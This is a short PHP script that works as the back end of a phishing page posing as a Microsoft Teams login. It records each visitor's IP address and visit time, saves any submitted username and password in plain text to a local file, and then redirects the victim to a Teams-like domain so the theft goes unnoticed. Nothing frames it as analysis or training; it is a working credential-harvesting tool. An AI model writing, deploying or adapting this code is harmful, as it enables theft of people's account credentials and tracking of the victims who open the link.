<?php
// Get IP address
$ip = isset($_SERVER['HTTP_CLIENT_IP']) 
    ? $_SERVER['HTTP_CLIENT_IP'] 
    : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);

// If this is a form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    file_put_contents("usernames.txt", "Teams Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
    header('Location: https://teams.ac.in/');
    exit();
} 
// If someone just opened the link
else {
    file_put_contents("usernames.txt", "Teams Link opened by IP: " . $ip . " at " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
}
?> 